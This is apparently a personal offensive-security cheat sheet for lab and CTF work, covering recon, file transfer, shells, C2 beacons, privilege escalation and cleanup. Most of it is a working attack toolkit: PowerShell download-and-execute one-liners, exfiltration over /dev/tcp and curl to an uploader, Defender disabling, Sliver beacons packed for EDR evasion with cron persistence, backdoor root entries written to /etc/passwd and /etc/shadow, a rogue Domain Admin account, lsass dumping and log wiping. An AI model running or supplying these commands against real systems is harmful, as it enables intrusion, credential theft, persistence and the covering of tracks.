# UltraHacking

WiRE - Write, IsItARabbitHole, Read, Execute
Is me or environment
Full Systemic review
- What commands should be included really?

Sliver Talk noted to scrap from Holo rererererererere.....

https://github.com/xct/wiki
# Ultra Hacking

Logging

Tmux

VPNs - NEEDS work!
```
sudo openvpn --script-security 2 --down vpn-down.sh --config $config VPNKeys/$VPNfile
```
https://openvpn.net/community-resources/creating-configuration-files-for-server-and-clients/
https://openvpn.net/community-resources/how-to/#examples
## Bash Scripting for Pentesting 

Forgettable command only! 
```bash
!! # ready last command
xargs -I {} $CMD {} # for all weird non-stdout issues
xsel -b # for copying from stdout
man $Everything # RTFM
apropos $string # search by keyword manual descript
comm # compare files
binwalk # 
xxd # hex dump a file
vimdiff	# opens vim with highlighting between multiple files

# quick and dirty MD5 hashes
echo -n 'text to be encrypted' | openssl md5

# Detirmine if a port is open or closed in bash
(: </dev/tcp/127.0.0.1/80) &>/dev/null && echo "OPEN" || echo "CLOSED"

cat names.txt| grep -ow '\b.\{5\}\b' # five letter words please

engrampa $file.zip

# Processes
top # realtime process stats
fuser # Show which processes are using the named files, sockets, or filesystems- what is keeping it open
fuser -v <portnumber>/<protocol> 
nsenter # execute, start processes and place them within the same namespace as another

# Linux File ACLs and Attributes 
getfacls
chattr
lsattr

# Do Stuff a number of times
for i in $(seq $x $y); do $CMD; done
# Create bash variables from sequence, useful in using `awk`
for i in {1..10}; do echo "\"$$i\" "; done | tr -d '\n'

# REGEXes

```

Batch
```powershell
dir /a /q # All files and owners (need q builtin)

```
PowerShell
```powershell
# Constrained Language Mode check
$ExecutionContext.SessionState.LanguageMode
# Utility
| Measure-Object -Line # Measure the amount of lines
| Ft -autosize -wrap # Prevent output truncation
| fl # Prevent output truncation


# File transfer and execute powershell
iex(iwr http://<ip>/x.ps1 -usebasicparsing)

# cmd.exe as SYSTEM
psexec.exe -i -s %SystemRoot%\system32\cmd.exe

# Streams
# Hidden Streams
Get-Item -Stream * <path>
# Alternate Data Streams
powershell -command "get-item <file> -stream *"
powershell -command "get-content <file> -stream root.txt"

# Inject .ps1 into a session
Invoke-Command -FilePath <script> -Sessions $sessions
Enter-PSSession -Session $sess


# Find files
# 

# Unzip
Expand-Archive <>
# Or 
Add-Type -assembly 'system.io.compression.filesystem';[io.compression.zipfile]::ExtractToDirectory("<archive path>","<target dir>")

# Disable Windows Defender
powershell.exe -exec bypass -command Set-MpPreference -DisableRealtimeMonitoring $true
# 
Add-MpPreference -ExclusionPath <path>

# Port Scan
22,53,80,443,445 | % { Test-Connection -ComputerName <ip> -Port $_ }

# Encrypt Files
# https://gallery.technet.microsoft.com/scriptcenter/EncryptDecrypt-files-use-65e7ae5d
$key = New-CryptographyKey -Algorithm AES  
# Encrypt the file 
Protect-File '.\secrets.txt' -Algorithm AES -Key $key -RemoveSource 
# Decrypt the file 
Unprotect-File '.\secrets.txt.AES' -Algorithm AES -Key $key -RemoveSource

```

## Background Recon

One liners 
```bash
ping -c 3 $IP

# -vvv for to get started asap
sudo nmap -Pn -sT -vvv -p- --min-rate 1000 -e tun0 -oA nmap/all-vvv-TCP-ports $IP
sudo nmap -sT -vvv -p- --min-rate 1000 -e tun0 -oA nmap/all-vvv-TCP-ports $IP
# Some nmap scans - no UDP
~/7ru7hGithub/AutomateRecon/exec-nmap-No-slowST-Or-sU.sh

# UDP
sudo nmap -sU -p- --min-rate 1000 -e tun0 -oA nmap/all-UDP-ports $IP
# Rescanning
sudo nmap -Pn -p- --min-rate 100 -e tun0 -oA nmap/all-tcp-ports-slower $IP
# Then all
~/7ru7hGithub/AutomateRecon/exec-all-nmap-AllTheScans.sh $IP 1000 tun0  

# Web needs

~/7ru7hGithub/AutomateRecon/exec-multitool-simple-web-app-OSCP-friendly.sh

gospider -d 0 -s "$URL" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt -o gospider
# JavaScript Enumeration
https://github.com/nullenc0de/gofuzz

nuclei -u http://$URL -etags exploit,cve,rce,sqli,xss,lfi,ssti,ssrf,csrf,xxe,traversal,crlf,csv,injection,pollution,smuggling -debug -me nuclei

nuclei -i $INTERFACE -u http://$URL -me nuclei

gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/big.txt -o big-www-root.gobuster

gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o rmdl-www-root.gobuster

--exclude-length # int or range 100-400

# Fuzzing
# maunallying check executable pages NULL -> html -> php

# recursive for one very specific thing
ffuf -w wordlist.txt:FUZZ -u http://$IP/FUZZ -recursion -recursion-depth 1 -e .php -v


# VHOSTs


ffuf -u http://mydomain.com -H "Host: FUZZ.mydomain.com" -c -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt:FUZZ -mc all -fw $wordifneeded -o $host_JhaddixVhost.ffuf

# extensions - 200 for valid, but consider duration and app context
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://$IP/index.FUZZ 
# pages
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://$IP/blog/FUZZ.php
# values
ffuf -w ids.txt:FUZZ -u http://$IP/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs $xxx
# parameters
ffuf -u 'http://$IP/path/?FUZZ=1' -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt 
# a burpsuite request `vim request.req` the file to add FUZZ
ffuf -request request.req -request-proto http
```
[GitHub - BishopFox/jsluice](https://github.com/BishopFox/jsluice) for Javascript secrets extraction
Run `docker run -p 3000:3000 lissy93/web-check`, then open `127.0.0.1:3000` -> run against site

- https://github.com/jthack/ffufai - ffuf with your AI API key

```bash
# User:User passwords
crackmapexec smb $ip -u users.txt -p users.txt --continue-on-success --no-brute
# After first domain user try these
crackmapexec ldap -L
adcs
enum_trusts
laps
maq # machineAccountQuota how many machine accounts a user can make; Default is 10 machines
```



```
wpscan --url $url -rua -e --api-token $APIKEY
```

```
cat nmap/.nmap | grep open | awk -F/ '{print $1}' | tr -s '\n' '-' | sed 's/-/\n- /g'
```

## Exploitation

Capture traffic on a interface of protocol and port in a version manner
```bash
sudo tcpdump -nvvvXi tun0 tcp port 80
```

Python3 virtual environments
```python
python3 -m venv .venv

source .venv/bin/activate 
pip3 install .

# deactivate # To deactivate virtual environment
```

## Networking

Change MAC Address to bypass some IPS
```bash
export MAC=xx:xx:xx:xx:xx:xx
ifconfig <int> hw ether <MAC>
macchanger -m <MAC> <int>
```
## Rogue Servers - Infil and Exfil 

```bash
ip a && ls -la && python3 -m http.server 8443
wsgidav --port=80 --host=192.168.45.231 --root=/tmp --auth=anonymous
impacket-smbserver -ip 192.168.45.231 share $(pwd) -smb2support  -username user -password pass
```

With the luxury of `ssh`
```bash
# Copy a local file to remote host 
scp <file> <user>@<host>:<dest>

# dump user directory with wildcard *
scp -i id_rsa user@10.10.10.10:* . 

# To copy a file from a remote server to your local machine:
scp -P $portnumber <user>@<host>:<src> <dest>

# To scp a file over a SOCKS proxy on localhost and port 9999 (see ssh for tunnel setup):
scp -o "ProxyCommand nc -x 127.0.0.1:9999 -X 4 %h %p" <file> <user>@<host>:<dest>

# To scp between two remote servers from the third machine:
scp -3 <user>@<host1>:<src> <user>@<host2>:<dest>
```

Windows Infil
```powershell
# The wonder that is certutil
certutil.exe -urlcache -split -f http://192.168.45.231:8443/CLIENTWK1.exe  C:\programdata\Word.exe
# Bitsadmin beware syntax between versions
bitsadmin /create 1 bitsadmin /addfile 1 http://Attacker_IP/payload.exe c:\Users\Guest\Desktop\payload.exe bitsadmin /RESUME 1 bitsadmin /complete 1


# SMB server with impacket
$pass = convertto-securestring 'stupid' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('idiot', $pass)
New-PSDrive -Name idiot -PSProvider FileSystem -Credential $cred -Root \\$IP\share
# with copy
copy \$IP\ROPNOP\exploit.exe
# Or xcopy
xcopy \\$ip\scriptserver\$scriptname-here
# OR for XP
net use H: \\$IP\$sharename /persistent:no
# You can add /user:$user password - not figure that out yet 
net use H: /Delete # To delete

# IWR
iwr -uri http://192.168.45.231:8443/winPEASx64.exe -Outfile winPEAS.exe
# -UseBasicParsing is deprecated as of powershell 6.0.0, running with in 6 has no affect 
Invoke-WebRequest http://10.10.10.10/bad.exe -UseBasicParsing
IEX(IWR http://10.10.10.10/Invoke-PowerShellTcp.ps1 -UseBasicParsing)

# Powercat
powercat -c 10.10.10.10 -p 54321 -i C:\Users\Administrator\powercat.ps1

# PowerShell New-Object System.Net.WebClient
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$bad.exe','$bad.exe')
# powershell required
IEX(New-Object System.Net.WebClient).DownloadString('http://$IP:$PORT/$bad.exe')

# Non Interactive PowerShell
echo $storageDir = $pwd > wget.ps1   
echo $webclient = New-Object System.Net.WebClient >> wget.ps1   
echo $url = "http://$IP:$PORT/$bad.exe" >> wget.ps1   
echo $file = "$bad.exe" >> wget.ps1   
echo $webclient.DownloadFile($url,$file) >> wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

```

#### Exfil

Linux
```bash
# if ssh use `scp` 
nc -lvnp 80 > $file
cat $file > /dev/tcp/10.10.10.10/80
```

Windows
```bash
# Exil over smb - alternative ius samba
impacket-smbserver -ip 10.10.10.10 share $(pwd) -smb2support -user test -password test 
net use z: \\10.10.10.10\share /user:test test
New-PSDrive -Name "EXfilDisk" -PSProvider "FileSystem" -Root "\\10.10.10.10\share"
copy $file Z:\


wsgidav --port=80 --host=192.168.45.231 --root=/tmp --auth=anonymous
# 



```

Host a http server, make directory owned by www-data
```bash
mkdir /var/www/uploads -p
chown www-data: /var/www/uploads 
```
Script to placed in /uploads/upload.php
```php
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Upload
```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://$IP/upload.php', 'bad.exe')
```

bad.php contains:
```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

```bash
curl --data "file=$(tar zcf - <directory> | base64)" http://webserver/bad.php
# Then from webserver decode and decompress
sed -i 's/ /+/g' /tmp/http.bs64
cat /tmp/http.bs64 | base64 -d | tar xvfz -

```

Linux to Linux Infil
```bash
nc -lvnp 80 < LinEnum.sh
bash -c "cat < /dev/tcp/$IP/$PORT > /dev/shm/LinEnum.sh"

```


Host a server to exfil
```bash
nc -lvnp 80 > file
```

## Shells

#### Tools

Linux Shell stabilisation
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
ctrl+z stty raw -echo; fg

# without python:
script -q /dev/null bash
```



Alh4zr3d Base64 encoded PowerShell reverse shell
```powershell
vim ~/Tools/psrev.txt
iconv -f ASCII -t UTF-16LE psrev.txt | base64 | tr -d "\n"
```

Hoaxshell - Windows only - NO INTERACTIVE sessions requires listener - see Cheatsheet in Archive
```bash
# Invoke-Expression (default)
sudo python3 hoaxshell.py -s <your_ip>
# Payload that writes and executes commands from a file
sudo python3 hoaxshell.py -s <your_ip> -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"
```

Writable SMB require
```bash
impacket-psexec $domain/$username:$password@$IP 


```


## Password Cracking

Linux Hashing

| ID     | Method   | Hashcat (`-m {#}`) | John the Ripper (`--format={name}`) |
| ------ | -------- | ------------------ | ----------------------------------- |
| `$1$`  | MD5      | 500                | md5crypt                            |
| `$2*$` | Blowfish | 3200               | bcrypt                              |
| `$5$`  | SHA-256  | 7400               | sha256crypt                         |
| `$6$`  | SHA-512  | 1800               | sha512crypt                         |
| `$y$`  | yescript | N/a                | crypt                               |

Windows Hashing

Method | Hashcat (`-m {#}`) | John the Ripper (`--format={name}`)
--- | --- | --- 
LM | 3000 | LM
NT | 1000 | NT
NetNTMLv1 | 5500 | netntlm
NetNTLMv2 | 5600 | netntlmv2
Kerberos 5 AS-REQ | 18200 | krb5asrep
Kerberos RC4 | 13100 | krb5tgs

## MSF

[[Msfvenom-Some-Good-Shells|Msfvenom-Some-Good-Shells]]

```bash
msfconsole -q -x 'use multi/handler'
```

```ruby
use multi/handler
set AutoRunScript post/windows/manage/migrate true
ExitOnSession false
# Manually migrate to privilege process if you have SeDebugPrivileges 
```

## Beacons and Shells 

Linux
```bash
generate beacon --mtls 10.50.104.57:8445 --arch amd64 --os linux --save /home/kali/Holo-2024/sliver.bin
# sliver listener
mtls -L 10.50.104.57 -l 8445 

CT="1 * * * *  root /root/sliver.nvm"
echo "$CT" | tee -a /etc/crontab
```

ScareCrow and `upx` for the CTF-level bypass of EDR - [Alh4zr3d](https://www.youtube.com/@alh4zr3d3)
```bash
# Generate sliver beacon shellcode disabling shikata ga nai
generate beacon --mtls 10.10.10.10:8443 --arch amd64 --os windows --save /tmp/8443-sliver.win -f shellcode -G
mtls -L 10.10.10.10 -l 8443 
# use 
/opt/ScareCrow/ScareCrow -I /tmp/8443-sliver.win -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
# Add For static without c runtime libraries
# Build with golang
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -trimpath
cp $JibberishName OneDrive.exe
# Pack with upx
upx OneDrive.exe
```


Sliver-O'Clock
```go
generate beacon --mtls 192.168.45.231:17200 --arch amd64 --os windows
mtls -L 192.168.45.231 -l 17200
// chown kali:kali *_*.exe && chmod +r *_*.exe
// upx 

// be warey of the arch!
upload /home/kali/Tools/mimikatz/x64/mimikatz.exe
upload /home/kali/Tools/mimikatz/x64/mimidrv.sys
upload /home/kali/Tools/mimikatz/x64/mimilib.dll    
upload /home/kali/Tools/mimikatz/x64/mimispool.dll

// SEND BACK SOME PEAS
execute -- bash -c "./linpeas.sh > /dev/tcp/$IP/34500"


execute -o icacls "c:\Windows\Temp"
execute -o whoami /all
execute -o net localgroup "administrators"
execute -o net group "domain admins" /domain
// reg query the WDIGEST
execute -o reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential
// Execute powershell to run a powershell script
execute -o powershell "c:\Windows\Temp\BadScript.ps1"
// Execute assemble 
// runs any .NET assembly!
// as a executable or DLL in memory either in sacrificial or the implant process
execute-assembly -s -i $localpath/Tool.exe -- -$flagsAndArgsOfTool

sharp-hound-4 -- '-c all,GPOLocalGroup'

execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All


execute -o cmd /c "C:\PATH\chisel.exe client --fingerprint $serverFingerprint --auth user:pass $serverIP:10000 $CLIENTARGS"
// nix chisel client
execute -o bash -c "/dev/shm/chisel client --fingerprint $serverFingerprint --auth user:pass $serverIP:10000 $CLIENTARGS"

// Within a sessions run a armory package eg:
// Enumeration
seatbelt -h
// -- to segment flags and arguments
seatbelt -- -group=all full
sharpup audit
// Kerberoasting
rubeus kerberoast
// Certificate Abuse
certify find /vulnerable
// From seamlsess intigence part 2, because this syntax makes it easy to understand than $variableNames
certify request /ca:sv001-dc.corp1.local\\corp1-SV001-DC-CA /template:WebServerVuln /altname:jboss
// openssl pkcs12 -in cert.cer -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
// rubeus to get tgt
rubeus asktgt /user:jboss /certificate:C:\\Windows\\system32\\cert.pfx

// psexec is embedded into sliver good for lateral movement
// Profile creation to use the same configuration
psexec -p <profile> <hostname>

prodump -p $lsasspid 
// pypykatz lsa minidump $procdump_sliveridstuff
```

## Chisel 

```bash
# Servers
chisel server --host $interfaceIP -p 10000 -v --socks5 --reverse --auth user:pass
# Clients 
chisel client --fingerprint $serverFingerprint --auth user:pass $serverIP:10000 $CLIENTARGS
# Always use the R:$serverIP:$NewPort never 127.0.0.1


# LPF

# RPF

# DPF

# DRSP


```
## Impacket
```bash
impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
```
## Bloodhound Data

#### JQ
```bash
# create bh_usernames.txt
cat*_users.json | jq '.data[].Properties | select( .enabled == true) | .name' | tr -d '\"' | awk -F@ '{print $1}' > bh_usernames.txt
# All enabled accounts with descriptions may contain passwords
cat *_users.json | jq '.data[].Properties | select( .enabled == true) | select( .description != null) | .name + " " + .description'

# Accounts with SPNS for impacket-GetUserSPNs 
cat *_users.json | jq -r '.data[].Properties | {name: .name, SPNs: .serviceprincipalnames[]?}'

#  For JSON in one array for .passwords fields
cat *.json | jq -r '.[] | .passwords'
```
#### Raw Queries
```json
// Match for objects
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m

// Has a session
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

```

## PrivEsc General


Get all the Latest Win and Lin PEASS!
```bash
# PEAS-NG
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o winPEAS.bat 
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o winPEASany.exe
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -o winPEASany_ofs.exe
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEASx64.exe
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64_ofs.exe -o winPEASx64_ofs.exe
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe -o winPEASx86.exe
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86_ofs.exe -o winPEASx86_ofs.exe
```


#### Linux 

```bash
# Service control
service <args> <service-name> # SysV Init distros - BEWARE
systemd
systemctl <verb> <service> # enable,disable,reload,start,stop,status
```

```
echo "r00t::0:0:root:/root:/bin/bash" >> /etc/passwd

echo "r00t:x:0:0:root:/root:/bin/bash" >> /etc/passwd
'r00ted:$6$9DjmffRHEHYUiYJg$c2kYZOlVhznBJ8LCvwtarJc1w/p2dinBd6KlKvwdih/bekhfe.Z30JqBuvaohBvATigQaYzwe4klgMtvkAjEd/:18400:0:99999:7:::' >> /etc/shadow

```


#### Windows

```powershell
# System
set pro # Architecture 
shutdown /r /fw /f /t 0 # Retart to system bios without touching a hotkey!


# CLI
| clip # copy to clipboard
echo use the streams > file.txt:<stream> #	create secondary data stream, use dir /R to see alternate data streams
echo use the streams < file.txt:<stream> #	pass the stream of file.txt to ..

# Networking
arp -a # display all network interfaces - IPv4 resolution!
getmac /v # get mac address
nbtstat # information related to NETBIOS name table and caching for local and remote machines
netsh # because it existes
netstat -anpo
route print # display active routes
# File System
assoc # File association 
assoc .filetype=APP # set default application to open/use file type 
icacls $file/directory # it is that important
copy 	# 	Copies one or more files to another location.
xcopy # exists
robocopy #	similar to copy but with network interuption support
ren # rename 
fc # file compare

# Tasks
tasklist /fi "IMaGENAME eq chisel.exe"
taskkill.exe /pid 3476 /F
# sc
sc query # Shows current state service, certian codes specific service
sc qc # Shows if autoastart enabled, dependencies, binary path name
sc start
sc stop
sc config <svc> *= # Set configuration of a service see /? for type of configuration changes avaliable

taskkill /PID $int # /F will force termination


```

`icacls $file/directory` - Directory permissions
```powershell
# perm is a permission mask and can be specified in one of two forms:
        # a sequence of simple rights:
                N - no access
                F - full access
                M - modify access
                RX - read and execute access
                R - read-only access
                W - write-only access
                D - delete access

	# a comma-separated list in parentheses of specific rights:
                DE - delete
                RC - read control
                WDAC - write DAC
                WO - write owner
                S - synchronize
                AS - access system security
                MA - maximum allowed
                GR - generic read
                GW - generic write
                GE - generic execute
                GA - generic all
                RD - read data/list directory
                WD - write data/add file
                AD - append data/add subdirectory
                REA - read extended attributes
                WEA - write extended attributes
                X - execute/traverse
                DC - delete child
                RA - read attributes
                WA - write attributes

# inheritance rights may precede either form and are applied
        # only to directories:
                (OI) - object inherit
                (CI) - container inherit
                (IO) - inherit only
                (NP) - don't propagate inherit
                (I) - permission inherited from parent container
```
Is the solution in here ...:

https://github.com/FuzzySecurity/PowerShell-Suite/tree/master
#### AD

**IP vs Hostnames Authentication Differences** 

Command  | Network Protocol | Authentication 
--- | --- | ---
`dir \\<DC IP>\SYSVOL` | IP | NTLM
`dir \\domain_name\SYSVOL` | DNS | Kerberos authentication


PowerShell `ActiveDirectory` module luxeries
```powershell
import-module ActiveDirectory
# General logic to syntax of powershell
# Get-X = retrieve information of a object
# Set-X = set a value
# New-X = Create a new
# Add-X = add something to a object that exists
# For examples creating a new Domain Admin 
New-ADUser -Name '7ru7h'
Set-ADAccountPassword -Identity 7ru7h -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
Add-ADGroupMember -Identity "Domain Admins" -Members "7ru7h"
Enable-ADAccount -Identity NVM
net localgroup "Administrators" 7ru7h /add 
gpupdate /force


# Display all trusts
Get-ADTrust -Filter *
# Get information about a user
Get-ADUser $user
Get-ADGroupMember $group -recursive

Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc

gpupdate /force 		# update group object policy, default is every 90mins!
gpresult /H outfile.html 	# use to figure out a result of multiple settings collision possibilities

# Change passwords
Set-ADAccountPassword <username> -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
# Force password reset on next logon
Set-ADUser -ChangePasswordAtLogon $true -Identity <username> -Verbose
```

force update the Group Policy
```powershell
gpupdate /force
```

[gist Tothi - No-Fix Local Privilege Escalation from low-priviliged domain user to local system on domain-joined computers.](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9) references [GitHub cube0x0 KrbRelay](https://github.com/cube0x0/KrbRelay)
## Cleanup 

Linux Cleanup
```bash
echo "" > /var/log/auth.log
echo "" > ~/.bash_history 
rm -rf ~/.bash_history 
history -c 
export HISTFILESIZE=0
export HISTSIZE=0
unset HISTFILE=

kill -9 $$

ln /dev/null ~/.bash_history -sf
```